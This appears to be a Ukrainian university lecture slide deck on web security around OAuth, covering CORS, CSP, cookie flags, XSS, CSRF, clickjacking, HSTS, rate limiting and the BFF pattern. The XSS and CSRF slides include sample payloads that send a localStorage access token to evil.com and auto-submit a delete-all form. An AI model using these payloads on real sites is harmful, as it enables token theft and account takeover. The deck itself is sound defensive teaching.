---
marp: true
theme: default
paginate: false
style: |
  section {
    font-family: 'Courier New', monospace;
    font-size: 28px;
    padding: 60px 80px;
    justify-content: flex-start;
  }
  h1 {
    color: #000;
    font-size: 42px;
    border-bottom: none;
    margin-bottom: 40px;
  }
  h2 {
    color: #000;
    font-size: 34px;
  }
  table {
    font-size: 24px;
    width: 100%;
  }
  th {
    background: none;
    border-bottom: 2px solid #000;
  }
  td, th {
    padding: 10px 16px;
  }
  code {
    font-size: 22px;
  }
  ul, ol {
    font-size: 28px;
    line-height: 1.6;
  }
  blockquote {
    border-left: 4px solid #999;
    color: #555;
  }
  section.title {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
  }
  section.title h1 {
    font-size: 44px;
    margin-bottom: 20px;
  }
  section.title p {
    font-size: 24px;
    margin: 4px 0;
  }
  .columns {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 40px;
  }
---

<!-- _class: title -->

# Захист інформації: OAuth від фундаменту до впровадження

Лекція 12. Безпека веб-додатків навколо OAuth

Львівський національний університет імені Івана Франка
Спеціальність 113 — Прикладна математика

2025

---

# План лекції

1. OAuth — не вся безпека
2. CORS (Cross-Origin Resource Sharing)
3. CSP (Content Security Policy)
4. Cookies: Secure, HttpOnly, SameSite
5. XSS та крадіжка токенів
6. CSRF — повторення та поглиблення
7. Clickjacking
8. HSTS (HTTP Strict Transport Security)
9. Rate Limiting
10. BFF Pattern (Backend for Frontend)
11. Cookie vs localStorage

---

# OAuth — не вся безпека

OAuth 2.0 відповідає на питання **«хто має доступ?»**, але не захищає від атак у веб-середовищі

Максим Витребенько додає web security headers до SecureNotes:

```
┌─────────────────────────────────────────────┐
│               SecureNotes                    │
│                                              │
│  OAuth 2.0 + PKCE       ← Лекції 4-11         │
│  + CORS                 ← Хто робить запити? │
│  + CSP                  ← Які скрипти OK?    │
│  + Secure Cookies       ← Як зберігати?      │
│  + HSTS                 ← Примусовий HTTPS   │
│  + Rate Limiting        ← Захист від brute   │
│  + BFF Pattern          ← Де живуть токени?  │
└─────────────────────────────────────────────┘
```

---

# Same-Origin Policy

**Same-Origin Policy** (SOP) — фундамент безпеки браузера

**Origin** = схема + хост + порт

```
https://notes.example.com:443
  │          │              │
  схема      хост           порт
```

| Origin A | Origin B | Однаковий? |
|---|---|---|
| `https://notes.example.com` | `https://notes.example.com/api` | Так |
| `https://notes.example.com` | `http://notes.example.com` | Ні (схема) |
| `https://notes.example.com` | `https://api.example.com` | Ні (хост) |

Без SOP будь-який сайт міг би читати відповіді від bank.com з cookies жертви

---

# CORS — послаблення SOP

**CORS** (Cross-Origin Resource Sharing) — протокол, що дозволяє серверу вказати дозволені origin'и

**Preflight-запит** (OPTIONS) перед «небезпечними» запитами:

```
Браузер                           Сервер
  │  OPTIONS /api/notes              │
  │  Origin: notes.example.com       │
  │─────────────────────────────────→│
  │                                  │
  │  Access-Control-Allow-Origin:    │
  │    notes.example.com             │
  │  Access-Control-Allow-Methods:   │
  │    GET, POST, PUT, DELETE        │
  │←─────────────────────────────────│
  │                                  │
  │  PUT /api/notes/42 (основний)    │
  │─────────────────────────────────→│
```

---

# CORS: налаштування

```python
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)

CORS(app, resources={
    r"/api/*": {
        "origins": ["https://notes.example.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Authorization", "Content-Type"],
        "max_age": 3600
    }
})
```

**Типові помилки:**
- `Access-Control-Allow-Origin: *` — дозволяє всім сайтам
- Відображення Origin без валідації — фактично те саме, що `*`

---

# CSP (Content Security Policy)

**CSP** — HTTP-заголовок, що обмежує джерела завантаження ресурсів

| Директива | Що контролює |
|---|---|
| `default-src` | Джерело за замовчуванням |
| `script-src` | JavaScript-скрипти |
| `style-src` | CSS-стилі |
| `connect-src` | fetch / XHR / WebSocket |
| `frame-ancestors` | Хто може вбудовувати у iframe |
| `object-src` | Плагіни (Flash, Java) |
| `base-uri` | Обмеження для `<base>` тега |

---

# CSP для SecureNotes

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self'
```

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "connect-src 'self' https://api.example.com; "
        "frame-ancestors 'none'; "
        "object-src 'none'"
    )
    return response
```

---

# Cookies: три атрибути безпеки

| Атрибут | Захист від | Що робить |
|---|---|---|
| `Secure` | HTTP sniffing | Лише через HTTPS |
| `HttpOnly` | XSS | Недоступний для JavaScript |
| `SameSite` | CSRF | Контролює крос-сайтову передачу |

**SameSite** має три значення:

| Значення | Поведінка |
|---|---|
| `Strict` | Лише з того самого сайту |
| `Lax` | + top-level GET-навігація |
| `None` | Завжди (вимагає `Secure`) |

---

# Cookies: приклад

```python
response.set_cookie(
    'session_id',
    value=session_token,
    httponly=True,      # недоступний для JS
    secure=True,        # лише через HTTPS
    samesite='Lax',     # не йде з крос-сайт POST
    max_age=3600,
    path='/'
)
```

```
XSS-атака (document.cookie)     → BLOCKED (HttpOnly)
CSRF POST (з evil.com)          → BLOCKED (SameSite)
HTTP sniffing (Wi-Fi)            → BLOCKED (Secure)
```

---

# XSS: три типи

**XSS** (Cross-Site Scripting) — впровадження шкідливого JS у довірену сторінку

**Stored XSS** — скрипт зберігається у БД (коментар, нотатка):
```html
<script>fetch('https://evil.com/steal?t='
  + localStorage.getItem('access_token'))</script>
```

**Reflected XSS** — скрипт у URL-параметрі:
```
/search?q=<script>alert('XSS')</script>
```

**DOM-based XSS** — JS використовує ненадійні дані для зміни DOM:
```javascript
document.getElementById('out').innerHTML
  = location.hash.slice(1);  // небезпечно!
```

---

# XSS: крадіжка токенів з localStorage

Якщо `access_token` у localStorage — будь-який JS на сторінці його читає:

```javascript
// Зловмисний скрипт (впроваджений через XSS)
const token = localStorage.getItem('access_token');

// Відправка зловмиснику
fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify({ token })
});

// Або дії від імені жертви
fetch('https://api.example.com/notes', {
    headers: { 'Authorization': 'Bearer ' + token }
});
```

> Одна XSS-вразливість = повний доступ до облікового запису

---

# Захист від XSS

1. **Екранування виводу** — завжди екрануйте дані у HTML, JS, CSS, URL
2. **CSP** — `script-src 'self'` блокує inline-скрипти
3. **HttpOnly cookies** — навіть при XSS зловмисник не прочитає cookie
4. **Не зберігайте токени у localStorage** — використовуйте HttpOnly cookies або BFF

```python
# Jinja2 екранує за замовчуванням:
# {{ user_input }}
# → &lt;script&gt;alert('XSS')&lt;/script&gt;

# НЕБЕЗПЕЧНО:
# {{ user_input | safe }}  ← НІКОЛИ з ненадійними даними
```

---

# CSRF (Cross-Site Request Forgery)

Зловмисний сайт змушує браузер надіслати запит з cookies жертви

```html
<!-- evil.com -->
<form action="https://api.example.com/notes/delete-all"
      method="POST" id="csrf-form">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

Максим відкриває evil.com → браузер шле POST з його cookies → нотатки видалено

**Захист:**
- `SameSite=Lax` — cookie не йде з крос-сайтових POST
- `SameSite=Strict` — cookie не йде взагалі з іншого сайту
- CSRF-токени як додатковий рівень

---

# CSRF та OAuth: параметр state

У OAuth 2.0 параметр `state` виконує функцію CSRF-токена:

```
1. Клієнт генерує state = random()
2. Зберігає state у сесії
3. Надсилає state у Authorization Request
4. Отримує state у callback
5. Порівнює з тим, що в сесії

Якщо не збігається → атака → відхилити
```

```python
csrf_token = secrets.token_hex(32)
session['csrf_token'] = csrf_token

# Перевірка
if request.form.get('csrf_token') != session.get('csrf_token'):
    abort(403, 'Invalid CSRF token')
```

---

# Clickjacking

Зловмисник накладає прозорий iframe з довіреним сайтом поверх своєї сторінки:

```
┌──────────────────────────────────┐
│   Сторінка зловмисника           │
│                                  │
│  "Натисніть для призу!"          │
│       ┌──────────┐               │
│       │ ВИГРАТИ! │  ← видима     │
│       └──────────┘               │
│  ┌───────────────────────────┐   │
│  │ (прозорий iframe)         │   │
│  │ SecureNotes: [Видалити]   │   │
│  └───────────────────────────┘   │
└──────────────────────────────────┘
```

**Захист:**
- `X-Frame-Options: DENY`
- `Content-Security-Policy: frame-ancestors 'none'`

---

# HSTS (HTTP Strict Transport Security)

**Проблема:** SSL Stripping — перехоплення першого HTTP-запиту

```
Жертва              Атакуючий           Сервер
  │  HTTP              │  HTTPS            │
  │───────────────────→│──────────────────→│
  │  Все відкритим     │                   │
  │  текстом!          │                   │
```

**HSTS** наказує браузеру завжди використовувати HTTPS:

```
Strict-Transport-Security:
  max-age=31536000; includeSubDomains; preload
```

- `max-age` — браузер пам'ятає 1 рік
- `includeSubDomains` — усі піддомени
- `preload` — вбудований список браузера (захищає перший запит)

---

# HSTS: налаштування

```python
@app.after_request
def set_hsts(response):
    response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains; preload'
    )
    return response
```

Перевірка:

```bash
curl -I https://notes.example.com | grep -i strict
# Strict-Transport-Security: max-age=31536000;
#   includeSubDomains; preload
```

Після першого візиту браузер **ніколи** не надішле HTTP-запит до цього домену

---

# Rate Limiting

Без обмежень зловмисник може:
- **Brute force паролів** — тисячі спроб/сек
- **Credential stuffing** — вкрадені пари email/пароль
- **DoS** — перевантаження сервера

```python
from flask_limiter import Limiter

limiter = Limiter(get_remote_address, app=app)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    ...

@app.route('/api/notes')
@limiter.limit("100 per minute")
def get_notes():
    ...
```

---

# Rate Limiting: HTTP-відповідь

```
HTTP/1.1 429 Too Many Requests
Retry-After: 60

{
  "error": "rate_limit_exceeded",
  "message": "Try again in 60 seconds."
}
```

Заголовки для клієнта:

```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 42
X-RateLimit-Reset: 1672531260
```

**Особливо важливо обмежити в OAuth:**
- Token endpoint (`/oauth/token`)
- Authorization endpoint
- Introspection endpoint

---

# BFF Pattern (Backend for Frontend)

**Проблема:** SPA зберігає токени у localStorage → XSS = крадіжка

**Рішення:** легкий бекенд між SPA та OAuth-сервером

```
┌─────────┐  cookie   ┌─────────┐  access_token  ┌─────────┐
│ Браузер │ ────────→ │  BFF    │ ─────────────→ │  API    │
│  (SPA)  │ ←──────── │ (сервер)│ ←───────────── │ Server  │
└─────────┘           └────┬────┘                └─────────┘
                           │ refresh_token
                           │ (на сервері)
                           ▼
                      ┌─────────┐
                      │  OAuth  │
                      │  Server │
                      └─────────┘
```

- Токени **недоступні** для JavaScript
- Refresh-токен **ніколи** не потрапляє у браузер
- У браузері лише HttpOnly session cookie

---

# BFF: приклад

```python
@app.route('/auth/callback')
def oauth_callback():
    code = request.args.get('code')

    # Обмін коду на токени — на сервері
    tokens = requests.post(
        'https://auth.example.com/token',
        data={
            'grant_type': 'authorization_code',
            'code': code,
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET
        }
    ).json()

    # Токени у серверній сесії, НЕ у браузері
    session['access_token'] = tokens['access_token']
    session['refresh_token'] = tokens['refresh_token']
    return redirect('/')
```

---

# Cookie vs localStorage

| Критерій | localStorage | HttpOnly Cookie |
|---|---|---|
| Доступний для JS | **Так** | **Ні** |
| XSS-стійкість | Вразливий | Стійкий |
| CSRF-стійкість | Стійкий | Потребує SameSite |
| Розмір | ~5-10 МБ | ~4 КБ |
| TTL | Немає | Max-Age / Expires |

```
             Є бекенд?
            /          \
          так           ні
          │              │
    BFF pattern     localStorage +
    HttpOnly cookie   PKCE + CSP +
    (токени на        короткий TTL
     сервері)
          │              │
      НАЙКРАЩИЙ      ПРИЙНЯТНИЙ
```

---

# Чеклист безпеки SecureNotes

```
[x] CORS: дозволено лише notes.example.com
[x] CSP: script-src 'self', frame-ancestors 'none'
[x] Cookies: Secure + HttpOnly + SameSite=Lax
[x] X-Frame-Options: DENY
[x] HSTS: max-age=31536000; includeSubDomains; preload
[x] Rate Limiting: 5 логінів/хв, 100 API/хв
[x] BFF: токени на сервері, session cookie
[x] XSS: екранування + CSP
[x] CSRF: SameSite + state parameter
```

> Максим Витребенько перетворив SecureNotes з додатку з OAuth на **повністю захищений** веб-додаток

---

# Підсумки

- **CORS** — контрольований доступ для крос-доменних запитів
- **CSP** — обмеження джерел скриптів та ресурсів
- **Secure + HttpOnly + SameSite** — три рівні захисту cookies
- **XSS** — найнебезпечніша атака для SPA з токенами
- **CSRF** — SameSite cookies + CSRF-токени
- **HSTS** — примусовий HTTPS з першого запиту
- **Rate Limiting** — захист від перебору
- **BFF Pattern** — найбезпечніше зберігання токенів

---

# Що далі?

**Лекція 13: Проєктування безпечної системи. Підсумок**

- **Threat Modeling** — системний аналіз поверхні атаки
- **Penetration Testing** — практична перевірка вразливостей
- **Security Checklist** — комплексний чеклист для production
- **Incident Response** — план дій при інциденті безпеки

Від окремих механізмів захисту — до **цілісної стратегії безпеки**

---

<!-- _class: title -->

# Дякую за увагу!

Питання?
